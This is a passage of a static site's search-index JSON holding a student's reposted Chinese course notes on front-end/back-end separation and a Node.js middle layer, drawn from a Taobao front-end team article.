\u201c\u4e2d\u9014\u5c9b\u201d","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#_3","text":"\u8fd9\u5b66\u671f\u9009\u4fee\u4e86\u4e00\u95e8\u8bfe\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\uff0c\u8fd9\u95e8\u8bfe\u4e3b\u8981\u7684\u76ee\u7684\uff0c\u5c31\u662f\u8ba9\u6211\u4eec\u80fd\u591f\u5728\u5b66\u6821\u91cc\u62e5\u6709\u901a\u8fc7\u56e2\u961f\u5408\u4f5c\u5f00\u53d1\u4e00\u4e2a\u4ea7\u54c1\u7684\u7ecf\u9a8c\u3002\u4e00\u4e2a\u5c0f\u7ec45\u4e2a\u4eba\uff0c\u4ece\u9700\u6c42\u5206\u6790\u3001\u8f6f\u4ef6\u5f00\u53d1\u3001\u6d4b\u8bd5\u5230\u4ea4\u4ed8\u7684\u8fc7\u7a0b\u6211\u4eec\u90fd\u4f1a\u7ecf\u5386\u3002 \u6211\u5728\u601d\u8003\u6211\u4eec\u5e94\u8be5\u7528\u4ec0\u4e48\u6837\u7684\u6280\u672f\u6765\u505a\u8fd9\u4e2a\u9879\u76ee\u7684\u65f6\u5019\u9047\u5230\u4e86\u4e00\u4e9b\u95ee\u9898\u3002 \u6211\u4eec\u719f\u6089\u7684\u6280\u672f\uff0c\u53ea\u6709\u5728\u4e0a\u5b66\u671f\u505aJavaWeb\u5f00\u53d1\u7684\u65f6\u5019\u7528\u5230\u7684JSP + Servlet\u3002\u4f46\u6211\u611f\u89c9\u8fd9\u4e2a\u67b6\u6784\u65e0\u8bba\u662f\u5728\u524d\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ea4\u4e92\u4e0a\uff0c\u8fd8\u662f\u5728\u670d\u52a1\u7aef\u548c\u6570\u636e\u5e93\u7684\u4ea4\u4e92\u4e0a\u90fd\u975e\u5e38\u5730\u9ebb\u70e6\u3002 \u4e8e\u662f\u6211\u5e0c\u671b\u80fd\u591f\u4e86\u89e3\u76ee\u524d\u4e92\u8054\u7f51\u4f01\u4e1a\u5e38\u7528\u7684\u4e00\u4e9b\u524d\u540e\u7aef\u6280\u672f\uff0c\u5728\u6211\u7684\u641c\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u6211\u53d1\u73b0 \u524d\u540e\u7aef\u5206\u79bb \u548c Node.js \u8fd9\u4e24\u4e2a\u5173\u952e\u8bcd\u7ecf\u5e38\u51fa\u73b0\uff0c\u4f46\u6211\u5e76\u4e0d\u7406\u89e3\u5b83\u4eec\u662f\u4ec0\u4e48\u3002 \u6240\u4ee5\uff0c\u6211\u53c8\u5bf9\u8fd9\u4e24\u4e2a\u5173\u952e\u8bcd\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u6700\u7ec8\u627e\u5230\u4e86\u963f\u91cc\u5df4\u5df4 \u6dd8\u7cfb\u524d\u7aef\u56e2\u961f \u6240\u5199\u7684\u6587\u7ae0 \u300a\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\u300b \uff0c\u5b83\u8ba9\u6211\u5bf9\u524d\u540e\u7aef\u5206\u79bb\u4e5f\u6709\u4e86\u4e00\u4e9b\u4e86\u89e3\uff0c\u4e8e\u662f\u6211\u60f3\u8981\u8f6c\u8f7d\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 \u8fd9\u4e2a\u7cfb\u5217\u7684\u6587\u7ae0\u4e00\u5171\u67096\u4e2a\u7ae0\u8282\uff0c\u4ee5\u4e0b\u662f\u5bf9 \u7b2c\u4e00\u7ae0 \u7684\u5168\u6587\u8f6c\u8f7d\u3002","title":"\u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#_4","text":"\u4e3a\u4e86\u89e3\u51b3\u4f20\u7edf Web \u5f00\u53d1\u6a21\u5f0f\u5e26\u6765\u7684\u5404\u79cd\u95ee\u9898\uff0c\u6211\u4eec\u8fdb\u884c\u4e86\u8bb8\u591a\u5c1d\u8bd5\uff0c\u4f46\u7531\u4e8e\u524d/\u540e\u7aef\u7684\u7269\u7406\u9e3f\u6c9f\uff0c\u5c1d\u8bd5\u7684\u65b9\u6848\u90fd\u5927\u540c\u5c0f\u5f02\u3002\u75db\u5b9a\u601d\u75db\uff0c\u4eca\u5929\u6211\u4eec\u91cd\u65b0\u601d\u8003\u4e86\u201c\u524d\u540e\u7aef\u201d\u7684\u5b9a\u4e49\uff0c\u5f15\u5165\u524d\u7aef\u540c\u5b66\u90fd\u719f\u6089\u7684 Node.js\uff0c\u8bd5\u56fe\u63a2\u7d22\u4e00\u6761\u5168\u65b0\u7684\u524d\u540e\u7aef\u5206\u79bb\u6a21\u5f0f\u3002 \u968f\u7740\u4e0d\u540c\u7ec8\u7aef\uff08Pad/Mobile/PC\uff09\u7684\u5174\u8d77\uff0c\u5bf9\u5f00\u53d1\u4eba\u5458\u7684\u8981\u6c42\u8d8a\u6765\u8d8a\u9ad8\uff0c\u7eaf\u6d4f\u89c8\u5668\u7aef\u7684\u54cd\u5e94\u5f0f\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u4f53\u9a8c\u7684\u9ad8\u8981\u6c42\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u9488\u5bf9\u4e0d\u540c\u7684\u7ec8\u7aef\u5f00\u53d1\u5b9a\u5236\u7684\u7248\u672c\u3002\u4e3a\u4e86\u63d0\u5347\u5f00\u53d1\u6548\u7387\uff0c\u524d\u540e\u7aef\u5206\u79bb\u7684\u9700\u6c42\u8d8a\u6765\u8d8a\u88ab\u91cd\u89c6\uff0c\u540e\u7aef\u8d1f\u8d23\u4e1a\u52a1/\u6570\u636e\u63a5\u53e3\uff0c\u524d\u7aef\u8d1f\u8d23\u5c55\u73b0/\u4ea4\u4e92\u903b\u8f91\uff0c\u540c\u4e00\u4efd\u6570\u636e\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u5236\u5f00\u53d1\u591a\u4e2a\u7248\u672c\u3002 \u8fd9\u4e2a\u8bdd\u9898\u6700\u8fd1\u88ab\u8ba8\u8bba\u5f97\u6bd4\u8f83\u591a\uff0c\u963f\u91cc\u6709\u4e9b BU \u4e5f\u5728\u8fdb\u884c\u4e00\u4e9b\u5c1d\u8bd5\u3002\u8ba8\u8bba\u4e86\u5f88\u4e45\u4e4b\u540e\uff0c\u6211\u4eec\u56e2\u961f\u51b3\u5b9a\u63a2\u7d22\u4e00\u5957\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\u65b9\u6848\uff0c\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e9b\u4e0d\u65ad\u53d8\u5316\u7684\u8ba4\u8bc6\u4ee5\u53ca\u601d\u8003\uff0c\u8bb0\u5f55\u5728\u8fd9\u91cc\uff0c\u4e5f\u5e0c\u671b\u770b\u5230\u7684\u540c\u5b66\u53c2\u4e0e\u8ba8\u8bba\uff0c\u5e2e\u6211\u4eec\u5b8c\u5584\u3002","title":"\u524d\u8a00"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#1","text":"\u6700\u5f00\u59cb\u7ec4\u5185\u8ba8\u8bba\u7684\u8fc7\u7a0b\u4e2d\u6211\u53d1\u73b0\uff0c\u6bcf\u4e2a\u4eba\u5bf9\u524d\u540e\u7aef\u5206\u79bb\u7684\u7406\u89e3\u4e0d\u4e00\u6837\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u80fd\u5728\u540c\u4e00\u4e2a\u9891\u9053\u8ba8\u8bba\uff0c\u5148\u5c31\u4ec0\u4e48\u662f\u201d\u524d\u540e\u7aef\u5206\u79bb\u201d\u8fbe\u6210\u4e00\u81f4\u3002 \u5927\u5bb6\u4e00\u81f4\u8ba4\u540c\u7684\u524d\u540e\u7aef\u5206\u79bb\u7684\u4f8b\u5b50\u5c31\u662f SPA(Single Page Application)\uff0c\u6240\u6709\u7528\u5230\u7684\u5c55\u73b0\u6570\u636e\u90fd\u662f\u540e\u7aef\u901a\u8fc7\u5f02\u6b65\u63a5\u53e3\uff08AJAX/JSONP\uff09\u7684\u65b9\u5f0f\u63d0\u4f9b\u7684\uff0c\u524d\u7aef\u53ea\u7ba1\u5c55\u73b0\u3002 \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0cSPA \u786e\u5b9e\u505a\u5230\u4e86\u524d\u540e\u7aef\u5206\u79bb\uff0c\u4f46\u8fd9\u79cd\u65b9\u5f0f\u5b58\u5728\u4e24\u4e2a\u95ee\u9898\uff1a WEB \u670d\u52a1\u4e2d\uff0cSPA \u7c7b\u5360\u7684\u6bd4\u4f8b\u5f88\u5c11\u3002\u5f88\u591a\u573a\u666f\u4e0b\u8fd8\u6709\u540c\u6b65/\u540c\u6b65+\u5f02\u6b65\u6df7\u5408\u7684\u6a21\u5f0f\uff0cSPA \u4e0d\u80fd\u4f5c\u4e3a\u4e00\u79cd\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u73b0\u9636\u6bb5\u7684 SPA \u5f00\u53d1\u6a21\u5f0f\uff0c\u63a5\u53e3\u901a\u5e38\u662f\u6309\u7167\u5c55\u73b0\u903b\u8f91\u6765\u63d0\u4f9b\u7684\uff0c\u6709\u65f6\u5019\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u540e\u7aef\u4f1a\u5e2e\u6211\u4eec\u5904\u7406\u4e00\u4e9b\u5c55\u73b0\u903b\u8f91\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u540e\u7aef\u8fd8\u662f\u6d89\u8db3\u4e86 View \u5c42\u7684\u5de5\u4f5c\uff0c\u4e0d\u662f\u771f\u6b63\u7684\u524d\u540e\u7aef\u5206\u79bb\u3002 SPA \u5f0f\u7684\u524d\u540e\u7aef\u5206\u79bb\uff0c\u662f\u4ece\u7269\u7406\u5c42\u505a\u533a\u5206\uff08\u8ba4\u4e3a\u53ea\u8981\u662f\u5ba2\u6237\u7aef\u7684\u5c31\u662f\u524d\u7aef\uff0c\u670d\u52a1\u5668\u7aef\u7684\u5c31\u662f\u540e\u7aef\uff09\uff0c\u8fd9\u79cd\u5206\u6cd5\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u6211\u4eec\u524d\u540e\u7aef\u5206\u79bb\u7684\u9700\u6c42\uff0c\u6211\u4eec\u8ba4\u4e3a\u4ece\u804c\u8d23\u4e0a\u5212\u5206\u624d\u80fd\u6ee1\u8db3\u76ee\u524d\u6211\u4eec\u7684\u4f7f\u7528\u573a\u666f\uff1a \u524d\u7aef\uff1a\u8d1f\u8d23 View \u548c Controller \u5c42\u3002 \u540e\u7aef\uff1a\u53ea\u8d1f\u8d23 Model \u5c42\uff0c\u4e1a\u52a1\u5904\u7406/\u6570\u636e\u7b49\u3002 \u4e3a\u4ec0\u4e48\u53bb\u505a\u8fd9\u79cd\u804c\u8d23\u7684\u5212\u5206\uff0c\u540e\u9762\u4f1a\u7ee7\u7eed\u63a2\u8ba8\u3002","title":"1. \u4ec0\u4e48\u662f\u524d\u540e\u7aef\u5206\u79bb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#2","text":"\u5173\u4e8e\u8fd9\u4e2a\u95ee\u9898\uff0c\u7389\u4f2f\u7684\u6587\u7ae0 \u300aWeb \u7814\u53d1\u6a21\u5f0f\u6f14\u53d8\u300b \u4e2d\u89e3\u91ca\u5f97\u975e\u5e38\u5168\u9762\uff0c\u6211\u4eec\u518d\u5927\u6982\u7406\u4e00\u4e0b\uff1a","title":"2. \u4e3a\u4ec0\u4e48\u8981\u524d\u540e\u7aef\u5206\u79bb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#21","text":"\u7389\u4f2f\u63d0\u5230\u7684\u51e0\u79cd\u5f00\u53d1\u6a21\u5f0f\uff0c\u5404\u6709\u5404\u7684\u9002\u7528\u573a\u666f\uff0c\u6ca1\u6709\u54ea\u4e00\u79cd\u5b8c\u5168\u53d6\u4ee3\u53e6\u5916\u4e00\u79cd\u3002 \u6bd4\u5982\u540e\u7aef\u4e3a\u4e3b\u7684 MVC\uff0c\u505a\u4e00\u4e9b\u540c\u6b65\u5c55\u73b0\u7684\u4e1a\u52a1\u6548\u7387\u5f88\u9ad8\uff0c\u4f46\u662f\u9047\u5230\u540c\u6b65\u5f02\u6b65\u7ed3\u5408\u7684\u9875\u9762\uff0c\u4e0e\u540e\u7aef\u5f00\u53d1\u6c9f\u901a\u8d77\u6765\u5c31\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u3002 AJAX \u4e3a\u4e3b SPA \u578b\u5f00\u53d1\u6a21\u5f0f\uff0c\u6bd4\u8f83\u9002\u5408\u5f00\u53d1 APP \u7c7b\u578b\u7684\u573a\u666f\uff0c\u4f46\u662f\u53ea\u9002\u5408\u505a APP\uff0c\u56e0\u4e3a SEO \u7b49\u95ee\u9898\u4e0d\u597d\u89e3\u51b3\uff0c\u5bf9\u4e8e\u5f88\u591a\u7c7b\u578b\u7684\u7cfb\u7edf\uff0c\u8fd9\u79cd\u5f00\u53d1\u65b9\u5f0f\u4e5f\u8fc7\u91cd\u3002","title":"2.1. \u73b0\u6709\u5f00\u53d1\u6a21\u5f0f\u7684\u9002\u7528\u573a\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#22","text":"\u5728\u4e1a\u52a1\u903b\u8f91\u590d\u6742\u7684\u7cfb\u7edf\u91cc\uff0c\u6211\u4eec\u6700\u6015\u7ef4\u62a4\u524d\u540e\u7aef\u6df7\u6742\u5728\u4e00\u8d77\u7684\u4ee3\u7801\uff0c\u56e0\u4e3a\u6ca1\u6709\u7ea6\u675f\uff0cM-V-C \u6bcf\u4e00\u5c42\u90fd\u53ef\u80fd\u51fa\u73b0\u522b\u7684\u5c42\u7684\u4ee3\u7801\uff0c\u65e5\u79ef\u6708\u7d2f\uff0c\u5b8c\u5168\u6ca1\u6709\u7ef4\u62a4\u6027\u53ef\u8a00\u3002 \u867d\u7136\u524d\u540e\u7aef\u5206\u79bb\u6ca1\u529e\u6cd5\u5b8c\u5168\u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\uff0c\u4f46\u662f\u53ef\u4ee5\u5927\u5927\u7f13\u89e3\u3002\u56e0\u4e3a\u4ece\u7269\u7406\u5c42\u6b21\u4e0a\u4fdd\u8bc1\u4e86\u4f60\u4e0d\u53ef\u80fd\u8fd9\u4e48\u505a\u3002","title":"2.2. \u524d\u540e\u7aef\u804c\u8d23\u4e0d\u6e05"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#23","text":"\u6dd8\u5b9d\u7684 Web \u57fa\u672c\u4e0a\u90fd\u662f\u57fa\u4e8e MVC \u6846\u67b6 webx\uff0c\u67b6\u6784\u51b3\u5b9a\u4e86\u524d\u7aef\u53ea\u80fd\u4f9d\u8d56\u540e\u7aef\u3002 \u6240\u4ee5\u6211\u4eec\u7684\u5f00\u53d1\u6a21\u5f0f\u4f9d\u7136\u662f\uff0c\u524d\u7aef\u5199\u597d\u9759\u6001 demo\uff0c\u540e\u7aef\u7ffb\u8bd1\u6210 VM \u6a21\u7248\uff0c\u8fd9\u79cd\u6a21\u5f0f\u7684\u95ee\u9898\u5c31\u4e0d\u8bf4\u4e86\uff0c\u88ab\u5410\u69fd\u4e86\u5f88\u4e45\u3002\u76f4\u63a5\u57fa\u4e8e\u540e\u7aef\u73af\u5883\u5f00\u53d1\u4e5f\u5f88\u75db\u82e6\uff0c\u914d\u7f6e\u5b89\u88c5\u4f7f\u7528\u90fd\u5f88\u9ebb\u70e6\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53d1\u660e\u4e86\u5404\u79cd\u5de5\u5177\uff0c\u6bd4\u5982 VMarket\uff0c\u4f46\u662f\u524d\u7aef\u8fd8\u662f\u8981\u5199 VM\uff0c\u800c\u4e14\u4f9d\u8d56\u540e\u7aef\u6570\u636e\uff0c\u6548\u7387\u4f9d\u7136\u4e0d\u9ad8\u3002\u53e6\u5916\uff0c\u540e\u7aef\u4e5f\u6ca1\u6cd5\u6446\u8131\u5bf9\u5c55\u73b0\u7684\u5f3a\u5173\u6ce8\uff0c\u4ece\u800c\u4e13\u5fc3\u4e8e\u4e1a\u52a1\u903b\u8f91\u5c42\u7684\u5f00\u53d1\u3002","title":"2.3. \u5f00\u53d1\u6548\u7387\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#24","text":"\u6027\u80fd\u4f18\u5316\u5982\u679c\u53ea\u5728\u524d\u7aef\u505a\u7a7a\u95f4\u975e\u5e38\u6709\u9650\uff0c\u4e8e\u662f\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u540e\u7aef\u5408\u4f5c\u624d\u80fd\u78b0\u649e\u51fa\u706b\u82b1\uff0c\u4f46\u7531\u4e8e\u540e\u7aef\u6846\u67b6\u9650\u5236\uff0c\u6211\u4eec\u5f88\u96be\u4f7f\u7528 Comet \u3001 Bigpipe \u7b49\u6280\u672f\u65b9\u6848\u6765\u4f18\u5316\u6027\u80fd\u3002 \u4e3a\u4e86\u89e3\u51b3\u4ee5\u4e0a\u63d0\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u6211\u4eec\u8fdb\u884c\u4e86\u5f88\u591a\u5c1d\u8bd5\uff0c\u5f00\u53d1\u4e86\u5404\u79cd\u5de5\u5177\uff0c\u4f46\u59cb\u7ec8\u6ca1\u6709\u592a\u591a\u8d77\u8272\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u6211\u4eec\u53ea\u80fd\u5728\u540e\u7aef\u7ed9\u6211\u4eec\u5212\u5206\u7684\u90a3\u4e00\u5c0f\u5757\u7a7a\u95f4\u53bb\u53d1\u6325\u3002\u53ea\u6709\u771f\u6b63\u505a\u5230\u524d\u540e\u7aef\u5206\u79bb\uff0c\u6211\u4eec\u624d\u80fd\u5f7b\u5e95\u89e3\u51b3\u4ee5\u4e0a\u95ee\u9898\u3002","title":"2.4. \u5bf9\u524d\u7aef\u53d1\u6325\u7684\u5c40\u9650"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#3","text":"\u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb\uff0c\u5176\u5b9e\u7b2c\u4e00\u8282\u4e2d\u5df2\u7ecf\u6709\u4e86\u7b54\u6848\uff1a \u524d\u7aef\uff1a\u8d1f\u8d23 View \u548c Controller \u5c42\u3002 \u540e\u7aef\uff1a\u8d1f\u8d23 Model \u5c42\uff0c\u4e1a\u52a1\u5904\u7406/\u6570\u636e\u7b49\u3002 \\text{Figure 1. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb} \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u524d\u7aef\u638c\u63e1\u4e86 Controller \uff0c\u6211\u4eec\u53ef\u4ee5\u505a URL design\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u573a\u666f\u51b3\u5b9a\u5728\u670d\u52a1\u7aef\u540c\u6b65\u6e32\u67d3\uff0c\u8fd8\u662f\u6839\u636e View \u5c42\u6570\u636e\u8f93\u51fa JSON \u6570\u636e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u6839\u636e\u8868\u73b0\u5c42\u9700\u6c42\u5f88\u5bb9\u6613\u7684\u505a Bigpipe\uff0cComet\uff0cSocket \u7b49\u7b49\uff0c\u5b8c\u5168\u662f\u9700\u6c42\u51b3\u5b9a\u4f7f\u7528\u65b9\u5f0f\u3002","title":"3. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#31-nodejs","text":"\u5982\u679c\u60f3\u5b9e\u73b0\u4e0a\u56fe\u7684\u5206\u5c42\uff0c\u5c31\u5fc5\u7136\u9700\u8981\u4e00\u79cdweb\u670d\u52a1\u5e2e\u6211\u4eec\u5b9e\u73b0\u4ee5\u524d\u540e\u7aef\u505a\u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u6807\u9898\u63d0\u5230\u7684\u201c\u57fa\u4e8eNodeJS\u7684\u5168\u6808\u5f0f\u5f00\u53d1\u201d\u3002 \\text{Figure 2. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1} \u8fd9\u5f20\u56fe\u770b\u8d77\u6765\u7b80\u5355\u800c\u4e14\u5f88\u597d\u7406\u89e3\uff0c\u4f46\u6ca1\u5c1d\u8bd5\u8fc7\uff0c\u4f1a\u6709\u5f88\u591a\u7591\u95ee\u3002 SPA \u6a21\u5f0f\u4e2d\uff0c\u540e\u7aef\u5df2\u4f9b\u4e86\u6240\u9700\u7684\u6570\u636e\u63a5\u53e3\uff0cView \u524d\u7aef\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\uff0c\u4e3a\u4ec0\u4e48\u8981\u591a\u52a0 Node.js \u8fd9\u4e00\u5c42\uff1f \u591a\u52a0\u4e00\u5c42\uff0c\u6027\u80fd\u600e\u4e48\u6837\uff1f \u591a\u52a0\u4e00\u5c42\uff0c\u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u4e0d\u662f\u589e\u52a0\u4e86\uff1f \u591a\u52a0\u4e00\u5c42\u5c31\u591a\u4e00\u5c42\u98ce\u9669\uff0c\u600e\u4e48\u7834\uff1f Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java\uff1f \u8fd9\u4e9b\u95ee\u9898\u8981\u8bf4\u6e05\u695a\u4e0d\u5bb9\u6613\uff0c\u4e0b\u9762\u8bf4\u4e0b\u6211\u7684\u8ba4\u8bc6\u8fc7\u7a0b\u3002","title":"3.1. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#32-nodejs","text":"\u73b0\u9636\u6bb5\u6211\u4eec\u4e3b\u8981\u4ee5\u540e\u7aef MVC \u7684\u6a21\u5f0f\u8fdb\u884c\u5f00\u53d1\uff0c\u8fd9\u79cd\u6a21\u5f0f\u4e25\u91cd\u963b\u788d\u4e86\u524d\u7aef\u5f00\u53d1\u6548\u7387\uff0c\u4e5f\u8ba9\u540e\u7aef\u4e0d\u80fd\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u5f00\u53d1\u3002 \u89e3\u51b3\u65b9\u6848\u662f\u8ba9\u524d\u7aef\u80fd\u63a7\u5236 Controller \u5c42\uff0c\u4f46\u662f\u5982\u679c\u5728\u73b0\u6709\u6280\u672f\u4f53\u7cfb\u4e0b\u5f88\u96be\u505a\u5230\uff0c\u56e0\u4e3a\u4e0d\u53ef\u80fd\u8ba9\u6240\u6709\u524d\u7aef\u90fd\u5b66 Java\uff0c\u5b89\u88c5\u540e\u7aef\u7684\u5f00\u53d1\u73af\u5883\uff0c\u5199 VM\u3002 Node.js \u5c31\u80fd\u5f88\u597d\u7684\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u65e0\u9700\u5b66\u4e60\u4e00\u95e8\u65b0\u7684\u8bed\u8a00\uff0c\u5c31\u80fd\u505a\u5230\u4ee5\u524d\u5f00\u53d1\u5e2e\u6211\u4eec\u505a\u7684\u4e8b\u60c5\uff0c\u4e00\u5207\u90fd\u663e\u5f97\u90a3\u4e48\u81ea\u7136\u3002","title":"3.2. \u4e3a\u4ec0\u4e48\u8981\u589e\u52a0\u4e00\u5c42 Node.js"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/#33","text":"\u5206\u5c42\u5c31\u6d89\u53ca\u6bcf\u5c42\u4e4b\u95f4\u7684\u901a\u8baf\uff0c\u80af\u5b9a\u4f1a\u6709\u4e00\u5b9a\u7684\u6027\u80fd\u635f\u8017\u3002\u4f46\u662f\u5408\u7406\u7684\u5206\u5c42\u80fd\u8ba9\u804c\u8d23\u6e05\u6670\u3001\u4e5f\u65b9\u4fbf\u534f\u4f5c\uff0c\u4f1a\u5927\u5927\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u3002\u5206\u5c42\u5e26\u6765\u7684\u635f\u5931\uff0c\u4e00\u5b9a\u80fd\u5728\u5176\u4ed6\u65b9\u9762\u7684\u6536\u76ca\u5f25\u8865\u56de\u6765\u3002 \u53e6\u5916\uff0c\u4e00\u65e6\u51b3\u5b9a\u5206\u5c42\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f18\u5316\u901a\u8baf\u65b9\u5f0f\u3001\u901a\u8baf\u534f\u8bae\uff0c\u5c3d\u53ef\u80fd\u628a\u635f\u8017\u964d\u5230\u6700\u4f4e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u6dd8\u5b9d\u5b9d\u8d1d\u8be6\u60c5\u9875\u9759\u6001\u5316\u4e4b\u540e\uff0c\u8fd8\u662f\u6709\u4e0d\u5c11\u9700\u8981\u5b9e\u65f6\u83b7\u53d6\u7684\u4fe1\u606f\uff0c\u6bd4\u5982\u7269\u6d41\u3001\u4fc3\u9500\u7b49\u7b49\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4fe1\u606f\u5728\u4e0d\u540c\u4e1a\u52a1\u7cfb\u7edf\u4e2d\uff0c\u6240\u4ee5\u9700\u8981\u524d\u7aef\u53d1\u9001 5\uff0c6 \u4e2a\u5f02\u6b65\u8bf7\u6c42\u6765\u56de\u586b\u8fd9\u4e9b\u5185\u5bb9\u3002 \u6709\u4e86 Node.js \u4e4b\u540e\uff0c\u524d\u7aef\u53ef\u4ee5\u5728 Node.js 